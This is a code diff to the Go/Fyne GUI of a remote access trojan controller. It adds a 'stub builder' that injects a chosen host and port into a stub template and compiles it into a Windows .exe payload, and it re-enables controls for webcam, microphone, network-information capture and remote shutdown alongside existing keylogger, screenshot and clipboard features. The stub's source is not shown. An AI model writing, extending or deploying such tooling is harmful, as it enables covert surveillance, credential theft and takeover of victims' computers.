@@ -6,6 +6,9 @@ import (
 	"guiv1/misc"
 	"log"
 	"net"
+	"os"
+	"os/exec"
+	"path/filepath"
 	"strconv"
 	"strings"
 	"time"
@@ -162,10 +165,76 @@ func NewPopupWindow(w fyne.Window, app fyne.App, title string, message string, i
 	modal.Show()
 }
 
+func NewStubBuilderWindow(w fyne.Window, app fyne.App, title string, callback func(File)) {
+	modal := app.NewWindow(title)
+	modal.SetIcon(icns.Icons8("256", "spam.png", "fluency"))
+	ModalContainer := container.NewVBox()
+	ModalContainer.Layout = layout.NewVBoxLayout()
+
+	StubNameEntry := widget.NewEntry()
+	StubNameEntry.SetPlaceHolder(("Enter stub name"))
+
+	StubHostEntry := widget.NewEntry()
+	StubHostEntry.SetPlaceHolder("Enter host address")
+	StubPortEntry := widget.NewEntry()
+	StubPortEntry.SetPlaceHolder("Enter port number")
+
+	ConfirmBtn := widget.NewButton("Create Stub", func() {
+		stubName := StubNameEntry.Text
+		stubHost := StubHostEntry.Text
+		stubPort := StubPortEntry.Text
+		StubFileDist := filepath.Join(stubName + ".exe")
+		if stubName == "" || stubHost == "" || stubPort == "" {
+			NewPopupWindow(w, app, "Error", "Please fill in all the required fields.", icns.Icons8("256", "error.png", "fluency"))
+			return
+		}
+		StubFileContent, err := os.ReadFile(filepath.Join("stub", "stub.go"))
+		if err != nil {
+			log.Println("Error reading stub file:", err)
+			return
+		}
+		stubnew := strings.ReplaceAll(string(StubFileContent), "{STUB_HOST}", stubHost)
+		stubnew = strings.ReplaceAll(string(stubnew), "{STUB_PORT}", stubPort)
+		file, err := os.OpenFile(filepath.Join("stub", "dist", stubName+".go"), os.O_CREATE|os.O_WRONLY, 0644)
+		if err != nil {
+			log.Println("Error creating stub file:", err)
+			return
+		}
+		_, err = file.Write([]byte(stubnew))
+		if err != nil {
+			log.Println("Error writing to stub file:", err)
+			return
+		}
+		// base command to create the stub file
+		os.Chdir(filepath.Join("stub", "dist"))
+		stubCmd := exec.Command("go", "build", "-o", StubFileDist, stubName+".go")
+		err = stubCmd.Run()
+		if err != nil {
+			NewPopupWindow(w, app, "Error", "Error building stub file: "+err.Error(), icns.Icons8("256", "error.png", "fluency"))
+			return
+		} else {
+			// success, newpop up window to show the stub file location
+			NewPopupWindow(w, app, "Success", "Stub file created at: "+filepath.Join("stub", "dist", stubName+".exe"), icns.Icons8("256", "ok--v1.png", "fluency"))
+		}
+
+	})
+	content := container.NewVBox(
+		StubNameEntry,
+		StubHostEntry,
+		StubPortEntry,
+		ConfirmBtn,
+	)
+	modal.Resize(fyne.NewSize(400, 150))
+	modal.SetFixedSize(true)
+	modal.SetContent(content)
+	modal.CenterOnScreen()
+	modal.Show()
+}
+
 func NewRatHandler(w fyne.Window, app fyne.App) *fyne.Container {
 
 	TcpServer.Addr = ServerAddress
-	w.Resize(fyne.NewSize(1000, 800))
+	// w.Resize(fyne.NewSize(1000, 800))
 	w.CenterOnScreen()
 
 	rathandler.ConsoleLog.Scroll = container.ScrollBoth
@@ -180,6 +249,7 @@ func NewRatHandler(w fyne.Window, app fyne.App) *fyne.Container {
 	}
 	ToolBar_ExitBtn := widget.NewToolbarAction(icns.Icons8("256", "emergency-exit.png", "fluency"), func() {
 		w.Close()
+
 	})
 	ToolBar_MainSettingsBtn := widget.NewToolbarAction(icns.Icons8("256", "services.png", "fluency"), func() {
 		AppMainSettingsWindow := app.NewWindow("S7 Gui Settings")
@@ -190,7 +260,9 @@ func NewRatHandler(w fyne.Window, app fyne.App) *fyne.Container {
 
 	})
 	ToolBar_StubBuildBtn := widget.NewToolbarAction(icns.Icons8("256", "hammer-and-anvil.png", "fluency"), func() {
-
+		NewStubBuilderWindow(w, app, "Create Stub", func(file File) {
+			// Handle the created stub file here
+		})
 	})
 	ToolBar_RefreshConnection := widget.NewToolbarAction(icns.Icons8("256", "recurring-appointment.png", "fluency"), func() {
 
@@ -216,6 +288,7 @@ func NewRatHandler(w fyne.Window, app fyne.App) *fyne.Container {
 		ToolBar_RunRatServerBtn,
 		ToolBar_StopRatServerBtn,
 	)
+
 	NavBarLeft_CloseConnectionBtn := widget.NewButton("Close Connection", func() {
 		KillClientWindow(w, app, "Close Connection", func() {
 			for i, client := range rathandler.Clients {
@@ -672,15 +745,15 @@ func NewRatHandler(w fyne.Window, app fyne.App) *fyne.Container {
 	NavBarLeft_KeyLoggerBtn.SetIcon(icns.Icons8("256", "grand-master-key.png", "fluency"))
 	NavBarLeft_ScreenshotBtn.SetIcon(icns.Icons8("256", "take-screenshot.png", "fluency"))
 	NavBarLeft_WebCamCaptureBtn.SetIcon(icns.Icons8("256", "webcam.png", "fluency"))
-	NavBarLeft_WebCamCaptureBtn.Disable()
+	//NavBarLeft_WebCamCaptureBtn.Disable()
 	NavBarLeft_MicrophoneCaptureBtn.SetIcon(icns.Icons8("256", "microphone.png", "fluency"))
-	NavBarLeft_MicrophoneCaptureBtn.Disable()
+	//NavBarLeft_MicrophoneCaptureBtn.Disable()
 	NavBarLeft_ClipBoardCaptureBtn.SetIcon(icns.Icons8("256", "add-to-clipboard.png", "fluency"))
 	NavBarLeft_SystemInformationBtn.SetIcon(icns.Icons8("256", "system-information.png", "fluency"))
 	NavBarLeft_NetworkInformationBtn.SetIcon(icns.Icons8("256", "wired-network-connection.png", "fluency"))
-	NavBarLeft_NetworkInformationBtn.Disable()
+	//NavBarLeft_NetworkInformationBtn.Disable()
 	NavBarLeft_ShutdownSystemBtn.SetIcon(icns.Icons8("256", "shutdown.png", "fluency"))
-	NavBarLeft_ShutdownSystemBtn.Disable()
+	//NavBarLeft_ShutdownSystemBtn.Disable()
 	NavBarLeft := container.NewVBox(
 		widget.NewLabelWithStyle("Command Options", fyne.TextAlignCenter, fyne.TextStyle{Bold: true}),
 		widget.NewSeparator(),
